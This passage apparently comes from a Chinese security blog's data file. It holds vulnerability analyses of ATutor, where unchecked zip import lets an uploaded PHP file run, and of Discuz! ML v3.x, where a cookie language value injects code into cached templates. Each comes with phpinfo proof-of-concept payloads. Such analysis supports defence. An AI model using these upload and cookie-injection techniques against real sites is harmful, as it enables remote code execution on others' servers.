class=\"line\">    <span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/RemoteLanguageManager.class.php&#x27;</span>);</span><br><span class=\"line\">    $remoteLanguageManager = <span class=\"keyword\">new</span> RemoteLanguageManager();</span><br><span class=\"line\">    $language_code = explode(<span class=\"string\">&quot;_&quot;</span>,$_POST[<span class=\"string\">&#x27;language&#x27;</span>]);</span><br><span class=\"line\">    $remoteLanguageManager-&gt;import($_POST[<span class=\"string\">&#x27;language&#x27;</span>]);</span><br><span class=\"line\">    header(<span class=\"string\">&#x27;Location: language_import.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; (!is_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]) || !$_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>])) &#123;</span><br><span class=\"line\">    $msg-&gt;addError(<span class=\"string\">&#x27;LANG_IMPORT_FAILED&#x27;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; !$_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]) &#123;</span><br><span class=\"line\">    $msg-&gt;addError(<span class=\"string\">&#x27;IMPORTFILE_EMPTY&#x27;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;submit&#x27;</span>]) &amp;&amp; is_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class=\"line\">    $languageManager-&gt;import($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">    header(<span class=\"string\">&#x27;Location: ./language_import.php&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从language_import.php文件中35行起，可以发现文件上传相关代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170655-f1f7f882-860a-1.png\" alt=\"f1d2c8415c4c633298881ab7bf76d404.png\"></p>\n<p>从上图红框中代码可知，此处代码块是对文件上传情况进行校验</p>\n<p>在文件成功上传后，进入下一个if分支</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170715-fdb0bcea-860a-1.png\" alt=\"1121c09a5fd3ee682fdc0f35913ee33d.png\"></p>\n<p>在这个分支里，程序将调用$languageManager-&gt;import方法对文件进行处理</p>\n<p>继续跟入import方法，位于/mods/_core/languages/classes/LanguageManager.class.php文件中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// public</span></span><br><span class=\"line\"><span class=\"comment\">// import language pack from specified file</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">import</span>(<span class=\"params\">$filename</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $languageManager, $msg;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>], <span class=\"string\">&#x27;master&#x27;</span>))&#123;</span><br><span class=\"line\">        <span class=\"comment\">// hack to create path to subdir for imported github language packs</span></span><br><span class=\"line\">        $import_dir = str_replace(<span class=\"string\">&quot;.zip&quot;</span>, <span class=\"string\">&quot;&quot;</span>, $_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]).<span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;language&#x27;</span>]))&#123;</span><br><span class=\"line\">        $import_dir = $_POST[<span class=\"string\">&#x27;language&#x27;</span>].<span class=\"string\">&#x27;-master/&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;classes/pclzip.lib.php&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(AT_INCLUDE_PATH.<span class=\"string\">&#x27;../mods/_core/languages/classes/LanguagesParser.class.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t$import_path = AT_CONTENT_DIR . <span class=\"string\">&#x27;import/&#x27;</span>;</span><br><span class=\"line\">\t$import_path_tmp = $import_path.$import_dir;</span><br><span class=\"line\">\t$language_xml = @file_get_contents($import_path.<span class=\"string\">&#x27;language.xml&#x27;</span>);</span><br><span class=\"line\">\t$archive = <span class=\"keyword\">new</span> PclZip($filename);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($archive-&gt;extract(\tPCLZIP_OPT_PATH,\t$import_path) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;Error : &#x27;</span> . $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>在import方法中程序调用PclZip对压缩包进行处理</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$archive = <span class=\"keyword\">new</span> PclZip($filename);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(\tPCLZIP_OPT_PATH,\t$import_path) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;Error : &#x27;</span> . $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将这个poc.php打包为poc.zip</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170822-25b697e6-860b-1.png\" alt=\"0a70cb1152c4da8afdb860bb66d642d9.png\"></p>\n<p>访问如下链接以进入上传页面</p>\n<p><a href=\"http://target/ATutor/mods/_core/languages/language_import.php\">http://target/ATutor/mods/_core/languages/language_import.php</a></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170852-37944eea-860b-1.png\" alt=\"5a822f926e62f0615ed92126333ba784.png\"></p>\n<p>在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170925-4b189bba-860b-1.png\" alt=\"ed87891f5ab9fc8afbf586cb8eade5ed.png\"></p>\n<p>此时的$import_path值为atutor应用的/content/import路径：”content/import/”，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类</p>\n<h3 id=\"PclZip\"><a href=\"#PclZip\" class=\"headerlink\" title=\"PclZip\"></a>PclZip</h3><p>PclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。</p>\n<p>我们接下来看下import方法中是如何使用PclZip，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424170944-569374b0-860b-1.png\" alt=\"bef56d465f0158a156524a4d431262e2.png\"></p>\n<p>程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值</p>\n<p>我们来看下PCLZIP_OPT_PATH设置项的作用</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171002-61af3a0a-860b-1.png\" alt=\"6bf20e6b27427f39a0b6d536daa372e8.png\"></p>\n<p>可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为$import_path参数对应的路径</p>\n<p>解压成功后，poc.zip中内容出现在对应文件夹中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171017-6a7f415c-860b-1.png\" alt=\"dbfe063613c36620cdfc66cc3665443d.png\"></p>\n<p>查看poc.php中的值，可以发现poc上传成功</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171031-72c2b25e-860b-1.png\" alt=\"64cc162245f48311e259db798bb674a4.png\"></p>\n<p>访问如下地址，触发poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171047-7c27e9b8-860b-1.png\" alt=\"5da715061c21b6f94f2365b838a1a8bc.png\"></p>\n<p>除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：</p>\n<p>位于mods/_core/themes/import.php文件中的主题导入功能,代码如下:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* Imports a theme from a URL or Zip file to Atutor</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@access</span>  private</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@author</span>  Shozub Qureshi</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">import_theme</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $db;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $msg;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;url&#x27;</span>]) &amp;&amp; ($_POST[<span class=\"string\">&#x27;url&#x27;</span>] != <span class=\"string\">&#x27;http://&#x27;</span>) ) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($content = @file_get_contents($_POST[<span class=\"string\">&#x27;url&#x27;</span>])) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t⋮</span><br><span class=\"line\">        </span><br><span class=\"line\">\t<span class=\"comment\">// unzip file and save into directory in themes</span></span><br><span class=\"line\">\t$archive = <span class=\"keyword\">new</span> PclZip($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"comment\">//extract contents to importpath/foldrname</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!$archive-&gt;extract($import_path)) &#123;</span><br><span class=\"line\">\t\t$errors = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;IMPORT_ERROR_IN_ZIP&#x27;</span>, $archive-&gt;errorInfo(<span class=\"literal\">true</span>));</span><br><span class=\"line\">\t\tclr_dir($import_path);</span><br><span class=\"line\">\t\t$msg-&gt;addError($errors);</span><br><span class=\"line\">\t\theader(<span class=\"string\">&#x27;Location: index.php&#x27;</span>); </span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现这里也使用了extract方法将上传文件进行解压</p>\n<p>来看一下导入主题功能对应的前端页面</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171145-9ea9e234-860b-1.png\" alt=\"118a2873749d6200f96edfa1790637c9.png\"></p>\n<p>这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/</p>\n<p>在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171205-aac48c54-860b-1.png\" alt=\"25a945cf7202608265fdab6909a4e825.png\"></p>\n<p>位于/mods/_standard/tests/question_import.php文件的问题导入功能</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171225-b6d6cbd8-860b-1.png\" alt=\"54cecd39032e9d1de591ef8498bd8c04.png\"></p>\n<p>位于mods/_standard/patcher/index_admin.php文件的补丁导入功能</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200424171245-c280f6de-860b-1.png\" alt=\"1962fed0465d4cdf835a3274e8065876.png\"></p>\n<p>这些功能无一例外的存在着相似的漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>针对单一文件上传，大多数Web应用都会进行严格的文件类型检测，但是涉及到压缩包上传，很多应用都不会检测压缩包中的内容，直接将压缩包中内容解压到对应目录中，这样就会导致了这类漏洞的产生。</p>\n"},{"title":"Discuz-ML!-V3.X 远程代码执行漏洞分析","date":"2019-05-16T11:01:08.000Z","cover":"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/6a11aaf8e72231dbfe893194de0c45a0.png","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nDiscuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。该引擎基于Comsenz Inc.创建的着名的Discuz！X引擎开发。\n\n&nbsp;2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。\n\n<!--more-->\n\n# **0x01 漏洞描述**\n\n* * *\n\n2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。\n\n本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的\n\ncookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行\n\n简而言之，如下图流程可以简单的理解该漏洞\n\n首先，通过cookie传入payload，构造好的payload被写入template文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/7995123cf0180b71dfc3d5a14f812f0d.png)\n\n接着，这个被插入payload的template.php文件被include，造成代码执行\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/560fe841e93e9950aa9d23d2293d09c8.png)\n\n&nbsp;\n\n# **0x02 受影响的系统版本**\n\n* * *\n\nDiscuz! ML v.3.4\n\nDiscuz! ML v.3.3\n\nDiscuz! ML v.3.2\n\n&nbsp;\n\n# **0x03 漏洞分析**\n\n* * *\n\n本次漏洞是由于Discuz! ML于对于cookie字段的不恰当处理造成的\n\n程序对cookie中的language字段的操作过程，位于\\source\\class\\discuz\\discuz_application.php中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5a301814f5679822fd941f96e3aff9bb.png)\n\n在这里，从cookie中取出language值，未经过滤，直接赋值给$lng变量\n\n接着将$lng值赋值给名为DISCUZ_LANG的常量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/9cd8f9c903e9c0898cfaa4970d014328.png)\n\n在Discuz! ML中，在生成cachefile名时，需要使用到DISCUZ_LANG这个常量进行拼接\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png)\n\n由于DISCUZ_LANG常量由cookie中传递而来，并未经过任何过滤，因此DISCUZ_LANG常量可控\n\n&nbsp;\n\n在程序运行时，Discuz! ML会将template/default/common目录下的默认模板写入缓存\n\n在这个过程中，程序首先会打开并读取位于template/default/common目录下默认模板中的内容：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/4728787a3cba82433fc3d3fd9b3ab124.png)\n\n这里将读取的header.htm模板中的内容赋值给$template变量\n\n&nbsp;\n\n再读取默认模板内容之后，程序接下来通过preg_replace_callback方法对模板内容进行替换与修改\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8cc38ce61df32dc7b7d51c6e856e1372.png)\n\n在对默认模板内容进行修改时，注意如下图片中操作\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/423679b9a066fecd6550006cf68a4217.png)\n\n上图操作中，会将'$tplfile', '$fname', \".time().\", '$templateid', '$cachefile', '$tpldir', '$file'这些变量值拼接到名为headeradd的变量中\n\n&nbsp;\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/e3ddd6682f0ece27b9424bdc9434fb96.png)\n\nHeaderadd变量随后被拼接到$template中\n\n&nbsp;\n\n注意这里的headeradd变量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/27c609d1f8e1849863fba2ee289f7835.png)\n\n如上图红圈处，这里将cachefile变量拼接到headeradd变量中，间接的将cachfile变量拼接到template中。\n\n还记得cachefile变量吗？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png)\n\nCachefile变量的值，其中一部分是可控的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/39c1861505bb7b2cc9d80cfb98dde40e.png)\n\n例如上图，我们可以在其中插入形如 sc.’phpinfo().’的payload\n\n这个payload随着headeradd变量，被带入template中\n\n接下来，被污染的template值被写入缓存文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/fc5d5be10b4c6577c6f7c3caee88f0f9.png)\n\n如上图可见，最终写入的缓存文件名即为cachefile的值，内容即为template值，Payload已经随着headeradd拼接到template而被写入这个缓存文件中\n\n上图这里看起来比较杂乱，简化起来如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5f872ac8ce662e4f8fe7141128f4f97f.png)\n\n当缓存文件被注入如上文payload后，再次加载程序，\n\n当程序执行到位于\\source\\module\\forum\\forum_index.php处时：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8d202ec852784f1506f1f667d23c5acb.png)\n\n可见上图432行，会使用include方法包含 template方法的返回值\n\n&nbsp;\n\n跟进Template方法，找到其返回值，即是此处被include中的内容\n\nTemplate方法位于\\source\\function\\function_core.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/f6901cb506f6d06be066992005264466.png)\n\n在其654行处，可见返回cachefile路径，cachefile即为上文被植入payload的文件路径\n\n由此，被插入payload的缓存文件被include，其中构造好的payload被执行，造成代码执行漏洞\n\n&nbsp;\n\n# **0x04**  **修复建议**\n\n* * *\n\n目前官方没有进行修复，请时刻关注：https://bitbucket.org/vot/discuz.ml/commits/all，等待官方补丁。","source":"_posts/Discuz-ML-V3-X-Rce.md","raw":"---\ntitle: Discuz-ML!-V3.X 远程代码执行漏洞分析\ndate: 2019-05-16 19:01:08\ntags: web漏洞分析\ncategories: 技术\ncover: http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/6a11aaf8e72231dbfe893194de0c45a0.png\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nDiscuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。该引擎基于Comsenz Inc.创建的着名的Discuz！X引擎开发。\n\n&nbsp;2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。\n\n<!--more-->\n\n# **0x01 漏洞描述**\n\n* * *\n\n2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。\n\n本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的\n\ncookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行\n\n简而言之，如下图流程可以简单的理解该漏洞\n\n首先，通过cookie传入payload，构造好的payload被写入template文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/7995123cf0180b71dfc3d5a14f812f0d.png)\n\n接着，这个被插入payload的template.php文件被include，造成代码执行\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/560fe841e93e9950aa9d23d2293d09c8.png)\n\n&nbsp;\n\n# **0x02 受影响的系统版本**\n\n* * *\n\nDiscuz! ML v.3.4\n\nDiscuz! ML v.3.3\n\nDiscuz! ML v.3.2\n\n&nbsp;\n\n# **0x03 漏洞分析**\n\n* * *\n\n本次漏洞是由于Discuz! ML于对于cookie字段的不恰当处理造成的\n\n程序对cookie中的language字段的操作过程，位于\\source\\class\\discuz\\discuz_application.php中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5a301814f5679822fd941f96e3aff9bb.png)\n\n在这里，从cookie中取出language值，未经过滤，直接赋值给$lng变量\n\n接着将$lng值赋值给名为DISCUZ_LANG的常量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/9cd8f9c903e9c0898cfaa4970d014328.png)\n\n在Discuz! ML中，在生成cachefile名时，需要使用到DISCUZ_LANG这个常量进行拼接\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png)\n\n由于DISCUZ_LANG常量由cookie中传递而来，并未经过任何过滤，因此DISCUZ_LANG常量可控\n\n&nbsp;\n\n在程序运行时，Discuz! ML会将template/default/common目录下的默认模板写入缓存\n\n在这个过程中，程序首先会打开并读取位于template/default/common目录下默认模板中的内容：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/4728787a3cba82433fc3d3fd9b3ab124.png)\n\n这里将读取的header.htm模板中的内容赋值给$template变量\n\n&nbsp;\n\n再读取默认模板内容之后，程序接下来通过preg_replace_callback方法对模板内容进行替换与修改\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8cc38ce61df32dc7b7d51c6e856e1372.png)\n\n在对默认模板内容进行修改时，注意如下图片中操作\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/423679b9a066fecd6550006cf68a4217.png)\n\n上图操作中，会将'$tplfile', '$fname', \".time().\", '$templateid', '$cachefile', '$tpldir', '$file'这些变量值拼接到名为headeradd的变量中\n\n&nbsp;\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/e3ddd6682f0ece27b9424bdc9434fb96.png)\n\nHeaderadd变量随后被拼接到$template中\n\n&nbsp;\n\n注意这里的headeradd变量\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/27c609d1f8e1849863fba2ee289f7835.png)\n\n如上图红圈处，这里将cachefile变量拼接到headeradd变量中，间接的将cachfile变量拼接到template中。\n\n还记得cachefile变量吗？\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/200495f42362d36df811a8aae17e54e5.png)\n\nCachefile变量的值，其中一部分是可控的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/39c1861505bb7b2cc9d80cfb98dde40e.png)\n\n例如上图，我们可以在其中插入形如 sc.’phpinfo().’的payload\n\n这个payload随着headeradd变量，被带入template中\n\n接下来，被污染的template值被写入缓存文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/fc5d5be10b4c6577c6f7c3caee88f0f9.png)\n\n如上图可见，最终写入的缓存文件名即为cachefile的值，内容即为template值，Payload已经随着headeradd拼接到template而被写入这个缓存文件中\n\n上图这里看起来比较杂乱，简化起来如下图\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/5f872ac8ce662e4f8fe7141128f4f97f.png)\n\n当缓存文件被注入如上文payload后，再次加载程序，\n\n当程序执行到位于\\source\\module\\forum\\forum_index.php处时：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/8d202ec852784f1506f1f667d23c5acb.png)\n\n可见上图432行，会使用include方法包含 template方法的返回值\n\n&nbsp;\n\n跟进Template方法，找到其返回值，即是此处被include中的内容\n\nTemplate方法位于\\source\\function\\function_core.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/f6901cb506f6d06be066992005264466.png)\n\n在其654行处，可见返回cachefile路径，cachefile即为上文被植入payload的文件路径\n\n由此，被插入payload的缓存文件被include，其中构造好的payload被执行，造成代码执行漏洞\n\n&nbsp;\n\n# **0x04**  **修复建议**\n\n* * *\n\n目前官方没有进行修复，请时刻关注：https://bitbucket.org/vot/discuz.ml/commits/all，等待官方补丁。","slug":"Discuz-ML-V3-X-Rce","published":1,"updated":"2020-10-27T09:25:29.291Z","_id":"ckgrozu830009wsa9fifzctm8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。该引擎基于Comsenz Inc.创建的着名的Discuz！X引擎开发。</p>\n<p>&nbsp;2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h1><hr>\n<p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p>\n<p>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的</p>\n<p>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，而缓存文件随后又被加载，从而造成代码执行</p>\n<p>简而言之，如下图流程可以简单的理解该漏洞</p>\n<p>首先，通过cookie传入payload，构造好的payload被写入template文件中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/7995123cf0180b71dfc3d5a14f812f0d.png\"></p>\n<p>接着，这个被插入payload的template.php文件被include，造成代码执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/07/560fe841e93e9950aa9d23d2293d09c8.png\"></p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-受影响的系统版本\"><a href=\"#0x02-受影响的系统版本\" class=\"headerlink\" title=\"0x02 受影响的系统版本\"></a><strong>0x02 受影响的系统版本</strong></h1><hr>\n<p>Discuz! ML v.3.4</p>\n<p>Discuz! ML v.3.3</p>\n<p>Discuz! ML v.3.2</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a><strong>0x03 漏洞分析</strong></h1><hr>\n<p>本次漏洞是由于Discuz! ML于对于cookie字段的不恰当处理造成的</p>\n<p>程序对cookie中的language字段的操作过程，位于\\source\\class\\discuz\\discuz_application.php中</p>\n<p><img src= \"/img/loading.gif\" 